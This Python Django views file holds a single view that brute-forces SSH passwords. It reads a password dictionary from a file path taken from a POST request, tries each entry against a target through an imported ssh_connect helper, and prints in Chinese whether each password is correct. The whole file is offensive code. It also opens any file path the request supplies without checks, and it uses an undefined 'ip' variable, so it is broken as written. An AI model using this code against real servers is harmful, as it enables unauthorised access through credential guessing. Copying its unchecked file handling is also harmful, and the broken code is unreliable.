from django.shortcuts import render
from ssh import ssh_connect

# Create your views here.
def dos_ssh_root_password(request):
	if request.method == "POST":
		print(request.POST)
		passwdfile = open(request.POST.get("dictionary", ""), 'r')
		for passwd in passwdfile:
			ssh_list = [ip, passwd.strip(), request.POST.get("user", "")]
			ssh_result = ssh_connect(ssh_list)
			if ssh_result[0] == 0:
				print('密码: ' + ssh_result[1].strip() + '不正确')
			else:
				print('密码: ' + ssh_result[1].strip() + '正确')
				print(ssh_result[2].strip())





